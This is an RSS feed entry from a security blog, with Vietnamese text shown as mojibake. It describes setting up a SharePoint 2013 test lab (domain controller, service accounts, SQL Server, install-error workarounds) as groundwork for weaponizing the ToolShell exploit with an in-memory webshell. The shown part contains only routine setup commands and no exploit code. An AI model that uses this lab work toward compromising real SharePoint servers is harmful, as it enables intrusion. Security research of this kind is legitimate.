<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kev1n's Blog</title><link>https://kev1n1203.github.io/</link><description>Recent content on kev1n's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Jan 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://kev1n1203.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</title><link>https://kev1n1203.github.io/p/sharepoint-2013/</link><pubDate>Tue, 20 Jan 2026 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/p/sharepoint-2013/</guid><description>&lt;p&gt;Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &amp;ldquo;LÃ m Sharepoint Ä‘i em&amp;rdquo;. So yeah, here we are ğŸ—¿&lt;/p&gt;
&lt;h2 id="i-setup-guidelines"&gt;I. Setup Guidelines
&lt;/h2&gt;&lt;p&gt;Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d" target="_blank" rel="noopener"
&gt;https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://hackmd.io/@taidh/ByE7_Kqlh" target="_blank" rel="noopener"
&gt;https://hackmd.io/@taidh/ByE7_Kqlh&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="cáº¥u-hÃ¬nh-mÃ¡y-áº£o"&gt;Cáº¥u hÃ¬nh mÃ¡y áº£o:
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DC: WinServer 2012 - 2x2 cores - 4GB RAM&lt;/li&gt;
&lt;li&gt;SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM&lt;/li&gt;
&lt;li&gt;Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="dc"&gt;DC
&lt;/h3&gt;&lt;p&gt;Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJNrQMhole.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SharePoint
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: FarmAdmin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User logon name: sp_farmadmin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Bá» chá»n â€œUser must change password at next logonâ€
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Chá»n â€œPassword never expiresâ€
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;TÆ°Æ¡ng tá»± cho sp_service vÃ  sql_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sp_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SharePoint
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: Service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username: sp_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sql_service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;First name: SQL
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last name: Service
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username: sql_service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="sql-server"&gt;SQL Server
&lt;/h3&gt;&lt;p&gt;Join Domain vÃ  set DNS.
Táº£i SQL Server Express báº£n Advanced Ä‘á»ƒ cÃ i luÃ´n cáº£ thá»ƒ Management Studio. Link táº£i: &lt;a class="link" href="https://www.microsoft.com/en-us/download/details.aspx?id=43351" target="_blank" rel="noopener"
&gt;https://www.microsoft.com/en-us/download/details.aspx?id=43351&lt;/a&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y chá»n SQLEXPRADV_x64_ENU.exe vÃ  cÃ i Ä‘áº·t nhÆ° bÃ¬nh thÆ°á»ng.&lt;br&gt;
LÆ°u Ã½: Äá»ƒ khÃ´ng bá»‹ lá»—i &lt;code&gt;The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account.&lt;/code&gt; khi set ngÆ°á»i dÃ¹ng DC\sql_service cho SQL Server Database Engine thÃ¬ sá»­ dá»¥ng WinServer 2012 Ä‘á»ƒ set up, dÃ¹ng Win10 sáº½ bá»‹ lá»—i (mÃ¬nh khÃ´ng hiá»ƒu vÃ¬ sao).&lt;br&gt;
CÃ²n láº¡i config theo hÆ°á»›ng dáº«n cá»§a anh Jang vÃ  a TÃ iDH&lt;/p&gt;
&lt;h3 id="sharepoint-server"&gt;Sharepoint Server
&lt;/h3&gt;&lt;p&gt;Join Domain vÃ  set DNS.&lt;br&gt;
Link download file img sharepoint: &lt;a class="link" href="https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013" target="_blank" rel="noopener"
&gt;https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013&lt;/a&gt; =&amp;gt; Chá»n báº£n English&lt;br&gt;
WinServer 2012 dÃ­nh ráº¥t nhiá»u lá»—i khi set up SharePoint Server 2013:&lt;/p&gt;
&lt;h4 id="lá»—i-set-role-iis"&gt;Lá»—i set role IIS
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;There&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;during&lt;/span&gt; &lt;span class="n"&gt;Installation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="k"&gt;tool&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;unable&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="n"&gt;Application&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="n"&gt;Role&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Web&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IIS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Role&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Link tham kháº£o náº¿u gáº·p:&lt;br&gt;
&lt;a class="link" href="https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html" target="_blank" rel="noopener"
&gt;https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html&lt;/a&gt;&lt;br&gt;
&lt;a class="link" href="https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/" target="_blank" rel="noopener"
&gt;https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tá»± cÃ i Ä‘áº·t cÃ¡c feature báº±ng Powershell:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Copy file &lt;code&gt;C:\Windows\System32\ServerManager.exe&lt;/code&gt; ngay táº¡i folder System32 vÃ  Ä‘á»•i tÃªn thÃ nh &lt;code&gt;ServerManagerCMD.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Náº¿u váº«n khÃ´ng Ä‘Æ°á»£c, xem log táº¡i &lt;code&gt;%TEMP%&lt;/code&gt; =&amp;gt; prerequisiteinstaller.{thá»i gian cÃ i Ä‘áº·t}.log Ä‘á»ƒ Ä‘á»c log sáº½ tháº¥y command run update role nhÆ° sau:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\ServerManagerCmd.exe&amp;#34; -inputpath &amp;#34;C:\Users\SP_FAR~1\AppData\Local\Temp\PreFEB1.tmp.XML&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe&amp;#34; -i
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\cscript.exe&amp;#34; &amp;#34;C:\Windows\system32\iisext.vbs&amp;#34; /enext &amp;#34;ASP.NET v4.0.30319&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;#34;C:\Windows\system32\iisreset.exe&amp;#34; /noforce
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;CÃ³ thá»ƒ tá»± cháº¡y xong rá»“i restart mÃ¡y cÃ i tiáº¿p (biá»‡n phÃ¡p cuá»‘i cÃ¹ng)&lt;br&gt;
LÆ°u Ã½: KhÃ´ng táº¯t ServerManager khi Ä‘ang install. Náº¿u nhÆ° install tháº¥y lÃ¢u chá»©ng tá» Ä‘ang cháº¿t táº¡i bÆ°á»›c set Role nÃ y, nÃ³ Ä‘ang Ä‘á»£i káº¿t quáº£ tráº£ vá»&lt;/p&gt;
&lt;h4 id="lá»—i-khi-download-cÃ¡c-package"&gt;Lá»—i khi download cÃ¡c package
&lt;/h4&gt;&lt;p&gt;Khi download cÃ¡c package nhÆ° SQL Server Native Client vÃ  cÃ¡c package sau sáº½ liÃªn tá»¥c dÃ­nh lá»—i vÃ¬ WinServer 2012 Ä‘Ã£ cÅ© vÃ  khÃ´ng thá»±c hiá»‡n káº¿t ná»‘i Ä‘Æ°á»£c site go.microsoft.com (WinServer 2012 cÃ³ váº¥n Ä‘á» gÃ¬ Ä‘áº¥y vá»›i TLS1.2)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="n"&gt;HRESULT&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Beginning&lt;/span&gt; &lt;span class="n"&gt;download&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Sync&lt;/span&gt; &lt;span class="n"&gt;Framework&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt; &lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;SP1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fwlink&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;LinkID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;224449&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;InternetOpenUrl&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0X80072F07&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;2147012857&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;go&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fwlink&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;LinkID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;224449&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Download&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="mi"&gt;2025&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt; &lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Last&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äáº¿n Ä‘oáº¡n nÃ y thÃ¬ khi gáº·p lá»—i á»Ÿ Ä‘Ã¢u mÃ¬nh sáº½ copy link download fail táº¡i file log vÃ  táº£i á»Ÿ ngoÃ i, sau Ä‘Ã³ tá»± cÃ i cÃ¡c package vÃ o.&lt;br&gt;
ÄÃ¢y lÃ  cÃ¡c package mÃ¬nh Ä‘Ã£ táº£i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJvyZG3ogl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¡c file msi thÃ¬ cÃ³ thá»ƒ cháº¡y ngay, sau Ä‘Ã³ restart mÃ¡y cÃ i tiáº¿p.
CÃ²n má»™t sá»‘ file exe nÃªn cháº¡y command, cÃ i Ä‘áº·t giao diá»‡n xong Sharepoint váº«n sáº½ bÃ¡o lÃ  download error (khÃ´ng hiá»ƒu kiá»ƒu gÃ¬):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WcfDataServices.exe /quiet /norestart
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sau khi cÃ i Ä‘áº·t sau Ä‘á»u nÃªn restart rá»“i báº­t lÃªn cÃ i tiáº¿p, cho Ä‘áº¿n khi hiá»‡n quÃ¡ trÃ¬nh cÃ i Ä‘áº·t hoÃ n táº¥t thÃ¬ tiáº¿p tá»¥c cháº¡y setup.exe vÃ  lÃ m theo cÃ¡c bÆ°á»›c set up Sharepoint:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1bdZzhjxl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Cáº¥u hÃ¬nh Sharepoint theo máº·c Ä‘á»‹nh. Táº¡i bÆ°á»›c Database server nháº­p ip cá»§a mÃ¡y SQL Server lÃ  10.10.1.137 vÃ  ngÆ°á»i dÃ¹ng káº¿t ná»‘i lÃ  sp_service. Sau khi cáº¥u hÃ¬nh xong, truy cáº­p tá»›i Ä‘Æ°á»ng dáº«n http://sp-server:16504/ Ä‘á»ƒ xÃ¡c nháº­n Ä‘Ã£ cáº¥u hÃ¬nh Central Admin thÃ nh cÃ´ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkGND9yB-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p tá»¥c táº¡o site test collection:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Skme_qJrbx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
